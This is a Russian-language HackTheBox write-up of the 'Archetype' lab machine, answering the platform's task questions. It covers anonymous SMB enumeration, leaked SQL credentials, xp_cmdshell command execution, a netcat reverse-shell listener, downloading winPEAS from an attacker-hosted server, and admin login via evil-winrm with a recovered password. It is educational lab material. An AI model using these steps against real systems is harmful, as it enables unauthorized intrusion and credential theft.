# HackTheBox - Archetype

## Краткая сводка (Summary)
* **Целевая ОС:** Windows Server 2019 Standard
* **Вектор входа:** Анонимное перечисление сетевых папок по протоколу SMB -> Нахождение файла конфигурации `prod.dtsConfig` -> Получение учетных данных сервисного аккаунта базы данных `sql_svc`.
* **Первоначальный доступ (Initial Access):** Подключение к Microsoft SQL Server через утилиту `mssqlclient.py` -> Активация компонента `xp_cmdshell` -> Выполнение закодированного в Base64 Reverse Shell скрипта на PowerShell.
* **Повышение привилегий (Privilege Escalation):**
    * Загрузка и запуск скрипта локальной разведки `winpeas.exe` -> Обнаружение уязвимого файла истории команд.

---

## Разведка и Анализ

### Сканирование портов
Начинаю с быстрого сканирования портов и обнаруженных сервисов:
```bash
nmap -sC -sV [ip Archetype]
```

### Результат
```text
PORT     STATE    SERVICE      VERSION
135/tcp  open     msrpc        Microsoft Windows RPC
139/tcp  open     netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open     microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open     ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
5985/tcp open     http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

**Task 1: Which TCP port is hosting a database server?**
* **Ответ:** `1433` *(Стандартный порт СУБД Microsoft SQL Server)*.

### Перечисление SMB-ресурсов
Используя утилиту `smbclient` с флагом анонимного входа (`-N`), проверяем доступные общие сетевые папки на Windows-сервере:
```bash
smbclient -L \\[ip Archetype] -N
```

**Task 2: What is the name of the non-Administrative share available over SMB?**
* **Ответ:** `backups`

---

## Получение первоначального доступа (Initial Access)

### Ход выполнения:
1. Подключаемся напрямую к найденной сетевой директории без ввода пароля:
   ```bash
   smbclient //[ip Archetype]/backups -N
   ```
2. Находясь внутри интерактивного SMB-шелла, выполняем листинг файлов:
   ```text
   smb: \> ls
     prod.dtsConfig                     AR      609  Mon Jan 20 15:23:02 2020
   ```
3. Скачиваем файл конфигурации на нашу атакующую машину с помощью команды `get` и выходим из клиента:
   ```text
   smb: \> get prod.dtsConfig
   smb: \> exit
   ```
4. Читаем структуру скачанного файла с помощью `cat`:
   ```bash
   cat prod.dtsConfig
   ```
   Внутри строки подключения `ConnectionString` обнаруживаем открытые учетные данные подключения к СУБД:
   `Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;`

**Task 3: What is the password identified in the file on the SMB share?**
* **Ответ:** `M3g4c0rp123`

**Task 4: What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?**
* **Ответ:** `mssqlclient.py`

5. Подключаемся к базе данных Microsoft SQL Server, используя скрипт пакета Impacket и флаг Windows-аутентификации:
   ```bash
   impacket-mssqlclient ARCHETYPE/sql_svc@[ip Archetype] -windows-auth
   ```
6. В открывшейся SQL-консоли активируем процедуру запуска системных команд операционной системы с помощью встроенного макроса:
   ```text
   enable_xp_cmdshell
   ```

**Task 5: What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?**
* **Ответ:** `xp_cmdshell`

7. Проверяем работоспособность удаленного выполнения кода (RCE):
   ```text
   xp_cmdshell whoami
   output
   -----------------
   archetype\sql_svc
   ```
8. Запускаем слушатель Netcat на атакующей машине для обработки обратного подключения:
   ```bash
   nc -lvnp 4444
   ```
9. Чтобы избежать синтаксических ошибок парсера MSSQL при обработке кавычек, генерируем на атакующей машине PowerShell Oneliner скрипт и кодируем его в формат Unicode с последующим выводом в Base64.
10. Отправляем финальную команду в консоль MSSQL:
    ```text
    xp_cmdshell "powershell -e [сгенерируемый хэш в предыдущем шаге]"
    ```
11. В терминале с Netcat успешно ловим входящее соединение (`Reverse Shell`) от сервисного аккаунта `sql_svc`.
12. Переходим на рабочий стол пользователя и забираем первый флаг.
    ```powershell
    cd C:\Users\sql_svc\Desktop
    dir
    cat user.txt
    ```
---

## Повышение привилегий (Privilege Escalation)

**Task 6: What script can be used in order to search possible paths to escalate privileges on Windows hosts?**
* **Ответ:** `winpeas`

**Task 7: What file contains the administrator's password?**
* **Ответ:** `ConsoleHost_history.txt`

1. Скачиваем exe `winPEASx64.exe` на атакующую машину.
2. В папке с файлом поднимаем HTTP-сервер для отдачи: `python3 -m http.server 80`.
3. Из полученного шелла `sql_svc` скачиваем сканер:
   ```powershell
   Invoke-WebRequest -Uri "http://[IP атакующей машины]/winPEASx64.exe" -OutFile "winpeas.exe"
   ```
4. Запускаем утилиту для автоматического анализа системы: `.\winpeas.exe`.
5. Скрипт проводит глубокий аудит Windows и в разделе **PS history file** указывается путь к файлу истории `ConsoleHost_history.txt`, выводим его содержимое с паролем.

* **Пользователь:** `administrator`
* **Пароль:** `MEGACORP_4dm1n!!`

---

## Получение полного контроля (Root / Admin Access)

1. Открываем новое окно терминала на атакующей машине и запускаем удаленное интерактивное подключение по протоколу WinRM через порт `5985`:
   ```bash
   evil-winrm -i [ip Archetype] -u administrator -p 'MEGACORP_4dm1n!!'
   ```
2. После успешной авторизации получаем стабильную root-сессию PowerShell.
3. Переходим на рабочий стол суперпользователя и забираем финальный флаг машины:
   ```powershell
   cd C:\Users\Administrator\Desktop
   dir
   cat root.txt
   ```
